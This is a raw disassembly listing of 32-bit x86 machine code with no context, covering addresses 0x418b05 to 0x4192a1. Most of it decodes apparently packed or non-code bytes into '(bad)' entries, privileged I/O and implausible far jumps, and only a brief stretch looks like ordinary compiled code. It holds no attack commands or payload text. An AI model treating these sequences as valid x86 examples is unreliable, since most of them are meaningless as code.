  418b05:	mov    edi,0x5a8afc01
  418b0a:	fisttp DWORD PTR [esi]
  418b0c:	outs   dx,BYTE PTR ds:[esi]
  418b0d:	push   ecx
  418b0e:	mov    edi,0xb6c49ab3
  418b13:	jecxz  0x418b39
  418b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b16:	jecxz  0x418b96
  418b18:	jl     0x418b15
  418b1a:	mov    dl,bh
  418b1c:	cmp    al,0x50
  418b1e:	pop    eax
  418b1f:	pop    ss
  418b20:	sahf   
  418b21:	retf   0xd0f0
  418b24:	sbb    al,0x19
  418b26:	push   ss
  418b27:	(bad)
  418b2b:	imul   esi,DWORD PTR [ecx-0x2226639f],0x4
  418b32:	xchg   BYTE PTR [ebp-0x1b045a7c],ch
  418b38:	sti    
  418b39:	fisub  DWORD PTR ds:0x3b0e5cb0
  418b3f:	pop    edx
  418b40:	xchg   edx,eax
  418b41:	mov    esi,0x9462e18f
  418b46:	stos   DWORD PTR es:[edi],eax
  418b47:	hlt    
  418b48:	dec    ecx
  418b49:	push   0xa
  418b4b:	stc    
  418b4c:	dec    esi
  418b4d:	icebp  
  418b4e:	stc    
  418b4f:	dec    esp
  418b50:	xchg   ebp,eax
  418b51:	mov    eax,0x7257e56b
  418b56:	ss iret 
  418b58:	xor    bh,bl
  418b5a:	outs   dx,DWORD PTR ds:[esi]
  418b5b:	icebp  
  418b5c:	xor    eax,0x10274abd
  418b61:	push   ecx
  418b62:	hlt    
  418b63:	daa    
  418b64:	jle    0x418afe
  418b66:	cmp    ebp,eax
  418b68:	fimul  WORD PTR fs:[ebx]
  418b6b:	in     al,dx
  418b6c:	adc    DWORD PTR [ebx-0xad05efc],edx
  418b72:	out    dx,al
  418b73:	mov    ecx,DWORD PTR [edi+0x6c]
  418b76:	test   eax,0xf3f10380
  418b7b:	sbb    BYTE PTR [ebp+0x43670961],bl
  418b81:	xor    BYTE PTR [esi],ah
  418b83:	adc    al,cl
  418b85:	or     eax,0x256efae
  418b8a:	mov    ecx,0xa3f0b0b5
  418b8f:	cmp    bh,BYTE PTR [ebx]
  418b91:	in     eax,0xe5
  418b93:	retf   0x9f9b
  418b96:	retf   0xd4ac
  418b99:	dec    ebx
  418b9a:	cwde   
  418b9b:	sbb    eax,0xc51d4e42
  418ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ba1:	pop    es
  418ba2:	fwait
  418ba3:	gs leave 
  418ba5:	out    0xd8,al
  418ba7:	sti    
  418ba8:	call   0x7147:0x1d1bbc2
  418baf:	push   edi
  418bb0:	mov    ds,WORD PTR [edx+0x5b]
  418bb3:	jl     0x418bdd
  418bb5:	mov    ah,0x19
  418bb7:	nop
  418bb8:	(bad)  
  418bb9:	xor    BYTE PTR [edx+0x251050b5],ch
  418bbf:	adc    cl,bl
  418bc1:	pop    es
  418bc2:	dec    ebp
  418bc3:	push   esp
  418bc4:	lahf   
  418bc5:	mov    ecx,DWORD PTR [edx+0x3f]
  418bc8:	imul   ecx,DWORD PTR [eax+0x3f],0x12
  418bcc:	adc    eax,0x27613d1e
  418bd1:	jo     0x418b6b
  418bd3:	sbb    dl,BYTE PTR [ebp-0x9]
  418bd6:	push   edx
  418bd7:	arpl   WORD PTR [edx-0x254db837],dx
  418bdd:	ret    0x5517
  418be0:	jo     0x418bc8
  418be2:	push   ds
  418be3:	int3   
  418be4:	mov    esi,DWORD PTR [esi]
  418be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be7:	(bad)  
  418be8:	out    dx,eax
  418be9:	aas    
  418bea:	fwait
  418beb:	out    0x8a,eax
  418bed:	dec    ecx
  418bee:	enter  0x1f8f,0x8
  418bf2:	mov    ah,0x4b
  418bf4:	scas   al,BYTE PTR es:[edi]
  418bf5:	retf   
  418bf6:	or     eax,0x73ad0782
  418bfb:	scas   al,BYTE PTR es:[edi]
  418bfc:	sbb    eax,0xdc0c5fd7
  418c01:	rcl    BYTE PTR [eax],1
  418c03:	loop   0x418c3a
  418c05:	leave  
  418c06:	xchg   esi,eax
  418c07:	push   0x18
  418c09:	mov    edx,0xcb400b83
  418c0e:	sti    
  418c0f:	aam    0x3f
  418c11:	mov    eax,ds:0x51903d6
  418c16:	in     al,0xaa
  418c18:	aaa    
  418c19:	pushf  
  418c1a:	dec    eax
  418c1b:	rol    DWORD PTR [eax+0x11],1
  418c1e:	adc    ebp,DWORD PTR cs:[esi-0x7c726243]
  418c25:	pop    ecx
  418c26:	mov    ch,0x83
  418c28:	mov    bl,0xeb
  418c2a:	test   BYTE PTR gs:[edi],0xbb
  418c2e:	push   ebx
  418c2f:	adc    eax,0xc1986522
  418c34:	in     al,0x5f
  418c36:	and    eax,0x110472a1
  418c3b:	push   ss
  418c3c:	add    ebx,DWORD PTR [ebp+ecx*8-0x2c]
  418c40:	pop    esp
  418c41:	std    
  418c42:	sbb    eax,DWORD PTR [esi+0x681ba144]
  418c48:	rcl    DWORD PTR [edi+0x5d],0x32
  418c4c:	inc    ebp
  418c4d:	add    al,0x26
  418c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c50:	mov    eax,ds:0xefed49bd
  418c55:	dec    eax
  418c56:	mov    bl,0xfd
  418c58:	jmp    0x793df3b9
  418c5d:	rcr    BYTE PTR [edi-0x5c096431],cl
  418c63:	je     0x418cd4
  418c65:	mov    cs,WORD PTR [ebx-0x2efc4fa3]
  418c6b:	xor    edx,ebx
  418c6d:	mov    DWORD PTR [ebp-0x50],edx
  418c70:	mov    edx,DWORD PTR [ebp+0x8]
  418c73:	mov    ebx,DWORD PTR [ebp-0x4c]
  418c76:	add    edx,edi
  418c78:	and    edx,ebx
  418c7a:	mov    DWORD PTR [ebp-0x4c],edx
  418c7d:	mov    edx,DWORD PTR [ebp+0x8]
  418c80:	mov    ebx,DWORD PTR [ebp-0x48]
  418c83:	lea    edx,[ebx+edx*1+0x241fcde]
  418c8a:	mov    DWORD PTR [ebp-0x48],edx
  418c8d:	mov    edx,DWORD PTR [ebp+0x8]
  418c90:	mov    ebx,0xfa5e1521
  418c95:	sub    ebx,edx
  418c97:	add    ebx,DWORD PTR [ebp-0x44]
  418c9a:	mov    DWORD PTR [ebp-0x44],ebx
  418c9d:	mov    edx,DWORD PTR [ebp+0x8]
  418ca0:	xor    edx,eax
  418ca2:	add    edx,esi
  418ca4:	jne    0x4144eb
  418caa:	jmp    0x41b0d8
  418caf:	jmp    0x41b050
  418cb4:	ins    BYTE PTR es:[edi],dx
  418cb5:	loopne 0x418cba
  418cb7:	jmp    0x418c3c
  418cb9:	mov    eax,DWORD PTR [ebx+ebx*8+0x6fd1292a]
  418cc0:	stos   DWORD PTR es:[edi],eax
  418cc1:	xchg   esp,eax
  418cc2:	push   0x7d1f32b8
  418cc7:	jp     0x418cc7
  418cc9:	pop    edi
  418cca:	jp     0x418d46
  418ccc:	dec    eax
  418ccd:	stos   DWORD PTR es:[edi],eax
  418cce:	retf   0xf824
  418cd1:	cmp    eax,0x737c238f
  418cd6:	sub    bl,ah
  418cd8:	shr    BYTE PTR [eax+0x65dfd3ff],1
  418cde:	sub    DWORD PTR [edx+edx*1+0x555e9f93],esp
  418ce5:	mov    edi,0x61670ea2
  418cea:	dec    esi
  418ceb:	xchg   ebx,eax
  418cec:	push   0x6d
  418cee:	xchg   ebx,eax
  418cef:	adc    esp,DWORD PTR [edi]
  418cf1:	or     eax,0xaa25347e
  418cf6:	fs enter 0xeb14,0x46
  418cfb:	and    ebp,DWORD PTR [esi-0x36059de2]
  418d01:	dec    eax
  418d02:	scas   eax,DWORD PTR es:[edi]
  418d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d04:	add    al,0xca
  418d06:	test   DWORD PTR [esi-0x4d],esi
  418d09:	shr    BYTE PTR [ecx],0x29
  418d0c:	mov    ds,WORD PTR [ebp-0xe]
  418d0f:	fsubr  QWORD PTR [ecx-0x48319c87]
  418d15:	adc    DWORD PTR [edi+0x54],0x31
  418d19:	sub    DWORD PTR [esi-0x9d62682],edx
  418d1f:	gs mov cl,0xf5
  418d22:	mov    ecx,0x6efae76d
  418d27:	sbb    DWORD PTR [esp+ebp*2],0x4c
  418d2b:	xchg   BYTE PTR [ebx+0x3c],al
  418d2e:	adc    bl,BYTE PTR [ebx]
  418d30:	sbb    al,0x50
  418d32:	cld    
  418d33:	popa   
  418d34:	mov    ecx,0xe6a8bb5c
  418d39:	fwait
  418d3a:	xor    eax,0x2fc82
  418d3f:	mov    ds:0x254dd36c,al
  418d44:	imul   ecx,DWORD PTR [edi],0x512e820c
  418d4a:	dec    ebp
  418d4b:	addr16 jge 0x418dac
  418d4e:	lods   eax,DWORD PTR ds:[esi]
  418d4f:	addr16 mov bh,0x28
  418d52:	sub    edi,DWORD PTR [eax]
  418d54:	add    edx,0xf60cb2c
  418d5a:	pop    esp
  418d5b:	xlat   BYTE PTR ds:[ebx]
  418d5c:	inc    ecx
  418d5d:	call   0x2c5f78d5
  418d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d63:	xlat   BYTE PTR ds:[ebx]
  418d64:	test   DWORD PTR [edi+0x5b],esp
  418d67:	xchg   ebp,eax
  418d68:	stc    
  418d69:	in     al,0xdd
  418d6b:	or     al,0x3d
  418d6d:	mov    ecx,0xa1102b6e
  418d72:	hlt    
  418d73:	cmp    al,0x7c
  418d75:	mov    al,ds:0xc3a358da
  418d7a:	mov    bh,0x66
  418d7c:	(bad)  
  418d7d:	jmp    0x8857:0xeab92e82
  418d84:	nop
  418d85:	es jle 0x418d8f
  418d88:	sub    DWORD PTR [ecx+0x7ab09fc9],edx
  418d8e:	retf   
  418d8f:	inc    eax
  418d90:	jae    0x418d71
  418d92:	je     0x418dbb
  418d94:	aad    0x5e
  418d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d97:	jp     0x418d73
  418d99:	push   cs
  418d9a:	test   DWORD PTR [edx+ecx*4],ebx
  418d9d:	push   ds
  418d9e:	inc    esp
  418d9f:	ja     0x418d22
  418da1:	push   ecx
  418da2:	jl     0x418dd2
  418da4:	xor    al,0xa7
  418da6:	repnz stc 
  418da8:	pusha  
  418da9:	(bad)  
  418daa:	out    dx,eax
  418dab:	or     DWORD PTR [ebp-0x4e6b3c2d],0xffffffe9
  418db2:	cmp    ch,0xaa
  418db5:	icebp  
  418db6:	aas    
  418db7:	fild   QWORD PTR [edi-0x45]
  418dba:	in     eax,dx
  418dbb:	push   0x49
  418dbd:	cmp    al,0xe5
  418dbf:	add    eax,edx
  418dc1:	and    esi,DWORD PTR [ebp-0x15]
  418dc4:	(bad)  
  418dc6:	popa   
  418dc7:	jmp    FWORD PTR [ebx+0x44]
  418dca:	lods   al,BYTE PTR ds:[esi]
  418dcb:	xchg   DWORD PTR [ecx+0x39],eax
  418dce:	in     al,dx
  418dcf:	mov    edi,0x97f151f4
  418dd4:	int3   
  418dd5:	cmp    al,0xe6
  418dd7:	xor    DWORD PTR [ecx+0x448be390],0xff6fa586
  418de1:	(bad)  
  418de2:	iret   
  418de3:	cld    
  418de4:	fstp   QWORD PTR [edi-0x27]
  418de7:	retf   
  418de8:	adc    DWORD PTR [esi],ebx
  418dea:	sbb    DWORD PTR [ebx],ecx
  418dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ded:	sub    BYTE PTR [ecx-0x2fd5d9d3],dl
  418df3:	inc    ebx
  418df4:	xor    esi,DWORD PTR [edx]
  418df6:	lds    esp,FWORD PTR [edx-0x4876a955]
  418dfc:	ins    BYTE PTR es:[edi],dx
  418dfd:	out    0x94,al
  418dff:	xchg   esp,eax
  418e00:	jg     0x418d84
  418e02:	mov    dh,0x51
  418e04:	or     ch,al
  418e06:	mov    ch,0xd2
  418e08:	adc    eax,DWORD PTR [ebp+esi*2-0x430352ac]
  418e0f:	dec    edx
  418e10:	mov    bl,0x9f
  418e12:	fsub   DWORD PTR [edx]
  418e14:	fld    TBYTE PTR [edx+0x5b0e9519]
  418e1a:	mov    bl,0x4
  418e1c:	sub    DWORD PTR [ebx-0x23031025],esp
  418e22:	arpl   WORD PTR [eax+0x50],si
  418e25:	in     eax,0x16
  418e27:	mov    edi,0x1e0d09ff
  418e2c:	jo     0x418e4a
  418e2e:	mov    edi,0x5319d892
  418e33:	aad    0xf4
  418e35:	or     al,0xb7
  418e37:	adc    BYTE PTR [ebp-0x80],bl
  418e3a:	sbb    al,dl
  418e3c:	or     BYTE PTR [edx-0x1f],0x34
  418e40:	cs and ebx,0x1e
  418e44:	sti    
  418e45:	mov    dh,0xd6
  418e47:	fcomp  DWORD PTR [ebp-0x38dd6d28]
  418e4d:	dec    ebx
  418e4e:	lods   eax,DWORD PTR ds:[esi]
  418e4f:	sahf   
  418e50:	popf   
  418e51:	xchg   BYTE PTR [ebx+0x30],ah
  418e54:	xor    al,0xd4
  418e56:	push   esi
  418e57:	mov    ebx,0x5ed02b82
  418e5c:	mov    bl,0xc2
  418e5e:	test   BYTE PTR [eax-0x2d],0xfb
  418e62:	in     al,0xc2
  418e64:	xor    al,0xc3
  418e66:	fsubr  QWORD PTR [esi-0x7d71cd2e]
  418e6c:	fld    QWORD PTR ds:[ebx+edx*2-0x5c5b5b0c]
  418e74:	mov    DWORD PTR [ebx+0x2339ab19],edi
  418e7a:	and    al,ah
  418e7c:	cmp    ecx,ebp
  418e7e:	jmp    0x2d79aad1
  418e83:	inc    edi
  418e84:	jmp    0x260703c6
  418e89:	dec    edi
  418e8a:	xor    edx,DWORD PTR [edi-0x4313d029]
  418e90:	aam    0x4d
  418e92:	xchg   DWORD PTR [edi+0x653f1102],eax
  418e98:	loop   0x418e8e
  418e9a:	stos   BYTE PTR es:[edi],al
  418e9b:	jl     0x418e2e
  418e9d:	std    
  418e9e:	fisttp DWORD PTR [eax]
  418ea0:	arpl   WORD PTR [esi+0x78],di
  418ea3:	cli    
  418ea4:	pop    esp
  418ea5:	cmp    al,al
  418ea7:	cld    
  418ea8:	xlat   BYTE PTR ds:[ebx]
  418ea9:	jbe    0x418e96
  418eab:	fsub   DWORD PTR [ecx-0x46]
  418eae:	or     DWORD PTR [eax-0x2],0xf405339
  418eb5:	aam    0xc2
  418eb7:	fcomp  QWORD PTR ds:0xaffbbb23
  418ebd:	adc    ah,cl
  418ebf:	xchg   ecx,eax
  418ec0:	push   es
  418ec1:	je     0x418f15
  418ec3:	xchg   BYTE PTR [ecx-0x2b],cl
  418ec6:	and    al,0x8
  418ec8:	cmc    
  418ec9:	outs   dx,BYTE PTR ds:[esi]
  418eca:	push   es
  418ecb:	jnp    0x418edb
  418ecd:	es sbb al,0x97
  418ed0:	xchg   edx,eax
  418ed1:	sub    cl,bl
  418ed3:	sbb    DWORD PTR [edi+0x57f5cd32],edi
  418ed9:	bound  ebp,QWORD PTR [ebx]
  418edb:	aaa    
  418edc:	fisttp DWORD PTR [eax+0x3f]
  418edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ee0:	xor    eax,0xff4c15b6
  418ee5:	fild   QWORD PTR [eax-0x6a4981d]
  418eeb:	or     ch,BYTE PTR [ebx-0x5db7b4f5]
  418ef1:	jne    0x418f23
  418ef3:	sahf   
  418ef4:	(bad)  
  418ef6:	sahf   
  418ef7:	fbld   TBYTE PTR [ecx+0x21]
  418efa:	stos   BYTE PTR es:[edi],al
  418efb:	clc    
  418efc:	xlat   BYTE PTR ds:[ebx]
  418efd:	mov    ebp,0xda02693
  418f02:	test   ecx,edx
  418f04:	lea    ebx,[ebp+0x49adfb46]
  418f0a:	rol    DWORD PTR [edx],1
  418f0c:	mov    ds:0x38dc2d07,eax
  418f11:	adc    dh,ch
  418f13:	mov    edi,0xfceb6f88
  418f18:	push   esp
  418f19:	mov    gs,WORD PTR [esi]
  418f1b:	xchg   edi,eax
  418f1c:	xchg   esi,eax
  418f1d:	mov    BYTE PTR [ebx],al
  418f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f20:	fistp  WORD PTR [ebp-0x355ed6e0]
  418f26:	arpl   WORD PTR [eax+0x60caa772],ax
  418f2c:	inc    esi
  418f2d:	xchg   esi,eax
  418f2e:	aas    
  418f2f:	fwait
  418f30:	mov    bh,0xaa
  418f32:	imul   esi,DWORD PTR [eax+0x53],0x23c75f11
  418f39:	hlt    
  418f3a:	rcl    BYTE PTR [eax],cl
  418f3c:	shl    DWORD PTR [edx],1
  418f3e:	jge    0x418eda
  418f40:	xor    al,0x44
  418f42:	pop    ds
  418f43:	sbb    DWORD PTR [ecx+edi*8+0xf],ebp
  418f47:	inc    DWORD PTR [edx-0x62]
  418f4a:	inc    esp
  418f4b:	fld    DWORD PTR [edx]
  418f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f4e:	ins    BYTE PTR es:[edi],dx
  418f4f:	test   BYTE PTR [edi+0x4e],ch
  418f52:	fucomi st,st(4)
  418f54:	retf   0xc220
  418f57:	scas   al,BYTE PTR es:[edi]
  418f58:	es sbb al,0x50
  418f5b:	(bad)  
  418f5d:	pop    es
  418f5e:	sub    BYTE PTR [ecx],bl
  418f60:	jo     0x418f72
  418f62:	jle    0x418f6a
  418f64:	adc    ebx,edi
  418f66:	sub    DWORD PTR [esi+0x62dc6200],0x48
  418f6d:	cmp    BYTE PTR [ebp-0xd],ch
  418f70:	fst    QWORD PTR [ecx+0x5a]
  418f73:	lds    edi,FWORD PTR ds:0x4974254e
  418f79:	rol    DWORD PTR [ebx-0x15],cl
  418f7c:	data16 addr16 rcr bl,1
  418f80:	test   esi,esi
  418f82:	ja     0x418fc5
  418f84:	icebp  
  418f85:	or     al,0xe2
  418f87:	rcr    edi,1
  418f89:	rcl    al,cl
  418f8b:	dec    edx
  418f8c:	jne    0x418f6f
  418f8e:	ss into 
  418f90:	stos   DWORD PTR es:[edi],eax
  418f91:	(bad)  [esi-0x12]
  418f94:	rcr    BYTE PTR [ecx],0x7a
  418f97:	repz ror BYTE PTR [ebp-0x68bea78f],1
  418f9e:	lock ret 
  418fa0:	fidiv  WORD PTR gs:[ecx-0x25]
  418fa4:	repnz dec ebp
  418fa6:	inc    ebp
  418fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fa8:	cli    
  418fa9:	push   ebx
  418faa:	and    eax,0x2405e79a
  418faf:	gs in  eax,0xa8
  418fb2:	or     ebp,DWORD PTR [ebx]
  418fb4:	pop    es
  418fb5:	dec    edi
  418fb6:	fs in  al,dx
  418fb8:	int3   
  418fb9:	cmp    esi,DWORD PTR [edx]
  418fbb:	into   
  418fbc:	and    bh,dl
  418fbe:	addr16 test eax,0xae1d4251
  418fc4:	add    eax,0x22fa06a9
  418fc9:	or     al,0x82
  418fcb:	aaa    
  418fcc:	mov    ah,0x6d
  418fce:	push   es
  418fcf:	adc    ebx,DWORD PTR [eax+0x5e4a71ed]
  418fd5:	dec    esi
  418fd6:	mov    dl,0xfb
  418fd8:	dec    eax
  418fd9:	iret   
  418fda:	or     eax,0x1cb6a9eb
  418fdf:	jbe    0x418f6d
  418fe1:	pop    esi
  418fe2:	or     BYTE PTR [eax-0x3c],ah
  418fe5:	fadd   QWORD PTR [edx+0x724f6e80]
  418feb:	stos   DWORD PTR es:[edi],eax
  418fec:	mov    al,0xc
  418fee:	and    ebx,DWORD PTR [ecx]
  418ff0:	xchg   edx,eax
  418ff1:	fldcw  WORD PTR [esi+ebx*8+0x1227530c]
  418ff8:	push   edx
  418ff9:	pop    esp
  418ffa:	bound  esi,QWORD PTR [ecx]
  418ffc:	mov    dh,0x6d
  418ffe:	shl    BYTE PTR [ecx-0x7b],0xe7
  419002:	xchg   edx,eax
  419003:	mul    BYTE PTR [edi-0x74c5dc86]
  419009:	stos   DWORD PTR es:[edi],eax
  41900a:	ins    BYTE PTR es:[edi],dx
  41900b:	pop    edi
  41900c:	add    dh,BYTE PTR [edi-0x5b4df961]
  419012:	pop    ds
  419013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419014:	lea    esi,[esi]
  419016:	xchg   BYTE PTR [esi],cl
  419018:	mov    WORD PTR [ecx+0x7f],?
  41901b:	add    BYTE PTR [eax],dl
  41901d:	pop    ebx
  41901e:	xor    ecx,DWORD PTR [ecx+ebp*2+0x69]
  419022:	mov    es,esp
  419024:	jmp    0x3732:0xe021a6ef
  41902b:	inc    ebx
  41902c:	(bad)  
  41902e:	sbb    cl,BYTE PTR [edx-0x414f67a6]
  419034:	aas    
  419035:	(bad)  
  419036:	iret   
  419037:	mov    bl,0x1a
  419039:	loope  0x419098
  41903b:	adc    al,0x92
  41903d:	inc    edx
  41903e:	mov    al,ds:0xb4bff9dc
  419043:	push   ecx
  419044:	mov    dh,0x5f
  419046:	xor    edi,DWORD PTR [ebx]
  419048:	repz (bad) 
  41904a:	jg     0x4190be
  41904c:	xchg   ecx,eax
  41904d:	jmp    0x61034d57
  419052:	outs   dx,DWORD PTR ds:[esi]
  419053:	or     DWORD PTR es:[esi+eiz*8],esp
  419057:	hlt    
  419058:	std    
  419059:	dec    ebx
  41905a:	(bad)  
  41905b:	jl     0x419064
  41905d:	dec    ecx
  41905e:	lea    esi,[edi+0x4ad95bfa]
  419064:	das    
  419065:	jne    0x419091
  419067:	adc    edx,DWORD PTR [edi-0x5e]
  41906a:	into   
  41906b:	push   ebx
  41906c:	enter  0x5c69,0xf6
  419070:	mov    ah,0x35
  419072:	push   edx
  419073:	inc    ebp
  419074:	add    bl,BYTE PTR [eax]
  419076:	imul   esi,DWORD PTR [esi+0x1f],0x74
  41907a:	jecxz  0x4190f4
  41907c:	(bad)  
  41907d:	sub    DWORD PTR [edx+ebp*8+0x6c96cf59],ebx
  419084:	retf   
  419085:	fs jno 0x4190f0
  419088:	cwde   
  419089:	pop    ebp
  41908a:	ds dec esi
  41908c:	jmp    0x5b62:0x19fb68c0
  419093:	mov    WORD PTR [ebp+0x64],cs
  419096:	or     DWORD PTR [edx],esp
  419098:	jp     0x41903d
  41909a:	loop   0x4190e2
  41909c:	mov    esp,edx
  41909e:	xchg   BYTE PTR [ecx+ecx*2],bh
  4190a1:	ins    DWORD PTR es:[edi],dx
  4190a2:	xor    DWORD PTR [edx-0x7adbf15b],ecx
  4190a8:	fwait
  4190a9:	mov    ecx,0xd2a6730a
  4190ae:	sahf   
  4190af:	mov    bh,0x9
  4190b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190b2:	push   ss
  4190b3:	sbb    cl,BYTE PTR [ecx-0x23]
  4190b6:	fs (bad) 
  4190b8:	in     eax,0x35
  4190ba:	into   
  4190bb:	mov    al,0x0
  4190bd:	add    esp,DWORD PTR [ebx+0x38]
  4190c0:	mov    ch,0xe2
  4190c2:	mov    eax,ds:0x46400d34
  4190c7:	push   ss
  4190c8:	(bad)  
  4190c9:	stos   BYTE PTR es:[edi],al
  4190ca:	ss nop
  4190cc:	pop    edx
  4190cd:	shl    BYTE PTR [esi+ebp*2+0x3bf7a3d4],cl
  4190d4:	pop    ebx
  4190d5:	fiadd  WORD PTR [edx]
  4190d7:	xchg   edi,eax
  4190d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190d9:	pop    esi
  4190da:	mov    ecx,DWORD PTR ds:0x3096f198
  4190e0:	mov    al,0xe7
  4190e2:	(bad)  
  4190e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e4:	add    DWORD PTR [edx-0x5508a000],ecx
  4190ea:	push   0x77
  4190ec:	mov    BYTE PTR [edi],ch
  4190ee:	test   BYTE PTR [edi-0x27d179a5],bh
  4190f4:	add    ebx,DWORD PTR [ecx-0x1b28e855]
  4190fa:	mov    ch,0x79
  4190fc:	mov    ah,BYTE PTR [ecx-0x368e1eac]
  419102:	std    
  419103:	je     0x419129
  419105:	leave  
  419106:	icebp  
  419107:	add    eax,0xce09f129
  41910c:	xor    DWORD PTR [ecx+0x56178e70],esp
  419112:	ss inc ebp
  419114:	or     ecx,DWORD PTR [edx]
  419116:	mov    ah,0xe9
  419118:	out    dx,eax
  419119:	shl    edx,1
  41911b:	xor    BYTE PTR [ebx-0x80],bl
  41911e:	scas   eax,DWORD PTR es:[edi]
  41911f:	and    edi,DWORD PTR [esi]
  419121:	mov    ecx,0xaaf3b80b
  419126:	adc    al,0xf6
  419128:	in     eax,0x13
  41912a:	pop    esi
  41912b:	mov    al,ds:0xb8f4302e
  419130:	inc    ebp
  419131:	(bad)  
  419132:	jecxz  0x4190be
  419134:	adc    ah,BYTE PTR [edx+0x7f]
  419137:	dec    esi
  419138:	jge    0x4191ae
  41913a:	mov    bl,BYTE PTR [eax]
  41913c:	xor    al,0xde
  41913e:	push   0xffffffad
  419140:	cwde   
  419141:	pop    edx
  419142:	inc    eax
  419143:	into   
  419144:	xchg   ebx,eax
  419145:	push   ebx
  419146:	or     BYTE PTR [ecx],dl
  419148:	jnp    0x419161
  41914a:	add    al,0xd4
  41914c:	mov    BYTE PTR [edx+edi*2+0x5e14f31c],ah
  419153:	mov    ch,BYTE PTR [ebx]
  419155:	push   0xffffffd0
  419157:	xchg   esp,eax
  419158:	or     ch,ah
  41915a:	push   es
  41915b:	and    bl,ah
  41915d:	(bad)  
  41915e:	and    DWORD PTR [esi-0x23a4afa],ebp
  419164:	and    al,0xd4
  419166:	ins    DWORD PTR es:[edi],dx
  419167:	sub    BYTE PTR ds:0xa4bedce9,bl
  41916d:	int    0x36
  41916f:	cwde   
  419170:	ja     0x4191b0
  419172:	mov    edx,0xafd53361
  419177:	adc    eax,0xcbf74be3
  41917c:	cmc    
  41917d:	pop    esp
  41917e:	loope  0x419198
  419180:	jnp    0x419196
  419182:	mov    ebp,0x64a1cd87
  419187:	pusha  
  419188:	daa    
  419189:	ret    0x5df8
  41918c:	mov    ebx,0x4642d7d5
  419191:	pop    eax
  419192:	les    ebp,FWORD PTR ds:0x26db671d
  419198:	out    0x6c,al
  41919a:	push   es
  41919b:	mov    cs,WORD PTR [esi+0x30]
  41919e:	pushf  
  41919f:	sar    BYTE PTR es:[ebx],1
  4191a2:	loopne 0x419174
  4191a4:	push   0x5f
  4191a6:	mov    al,0x61
  4191a8:	ror    DWORD PTR [edx-0x7e62eb03],0x5b
  4191af:	sti    
  4191b0:	in     al,dx
  4191b1:	mov    esi,0x7486e56
  4191b6:	pop    edx
  4191b7:	lods   al,BYTE PTR ds:[esi]
  4191b8:	or     DWORD PTR [edx+0x4d54993e],0xffffff9c
  4191bf:	mov    bh,0x34
  4191c1:	jp     0x41921c
  4191c3:	cmp    eax,0xe50d19c8
  4191c8:	jbe    0x4191d7
  4191ca:	or     eax,0x1cf27449
  4191cf:	stc    
  4191d0:	or     al,0x4
  4191d2:	xor    DWORD PTR [edx+0x5c],0x60
  4191d6:	mov    ch,BYTE PTR [ecx-0x3efa0f68]
  4191dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191dd:	rcl    BYTE PTR [edx-0x465cc7f4],0x33
  4191e4:	and    eax,0x7641732d
  4191e9:	and    DWORD PTR [ebx-0x4c],edi
  4191ec:	add    DWORD PTR es:[ecx-0x33],edi
  4191f0:	inc    edi
  4191f1:	sub    bh,BYTE PTR [edi-0x75b19021]
  4191f7:	cmp    cl,BYTE PTR [ecx]
  4191f9:	xor    ch,0xcc
  4191fc:	pop    ss
  4191fd:	icebp  
  4191fe:	clc    
  4191ff:	test   eax,0x692783c8
  419204:	mov    dh,0x14
  419206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419207:	out    dx,eax
  419208:	mov    al,0x36
  41920a:	aad    0xe6
  41920c:	cli    
  41920d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41920e:	jb     0x419277
  419210:	in     al,0xe8
  419212:	xor    BYTE PTR [ebp-0x5dffafa8],ch
  419218:	sbb    eax,0x21979979
  41921d:	jne    0x4191f4
  41921f:	or     ebp,DWORD PTR [edx]
  419221:	popa   
  419222:	inc    ebx
  419223:	out    0x80,eax
  419225:	out    dx,eax
  419226:	or     al,0x6e
  419228:	nop
  419229:	imul   ebp,DWORD PTR [ebx-0x46b91a48],0x4e
  419230:	ret    0x6965
  419233:	aam    0xe0
  419235:	mov    bp,0x573f
  419239:	imul   ebx
  41923b:	adc    ah,BYTE PTR [ebp+0x72]
  41923e:	into   
  41923f:	out    dx,eax
  419240:	adc    eax,0x5bef0a6e
  419245:	in     al,dx
  419246:	aas    
  419247:	imul   ecx,DWORD PTR es:[ebx-0x20831de6],0xa
  41924f:	or     al,BYTE PTR [eax+0x4e]
  419252:	push   eax
  419253:	mov    edi,0x4ff2cd00
  419258:	cmp    eax,ecx
  41925a:	add    eax,0x858d7914
  41925f:	adc    DWORD PTR [ebx+ecx*1+0x4c],esp
  419263:	jp     0x41922b
  419265:	lock inc edx
  419267:	xor    dh,BYTE PTR [edi]
  419269:	and    BYTE PTR [ebx],0x5c
  41926c:	dec    ebx
  41926d:	clc    
  41926e:	pop    edi
  41926f:	pop    esi
  419270:	sub    eax,edx
  419272:	mov    ebx,0x58350036
  419277:	imul   ecx
  419279:	dec    esi
  41927a:	lods   al,BYTE PTR ds:[esi]
  41927b:	fiadd  WORD PTR [ebx-0xb]
  41927e:	push   0x7b
  419280:	in     eax,dx
  419281:	jnp    0x4192d7
  419283:	stc    
  419284:	cmp    al,BYTE PTR [ecx-0x9]
  419287:	retf   0xe163
  41928a:	adc    al,0xda
  41928c:	pop    ecx
  41928d:	in     eax,dx
  41928e:	adc    ah,BYTE PTR [edx-0x1972f5e8]
  419294:	mov    ebx,0x7ca4a5ba
  419299:	es mov ebx,0x15d19bed
  41929f:	add    al,0xc8
  4192a1:	pop    esi
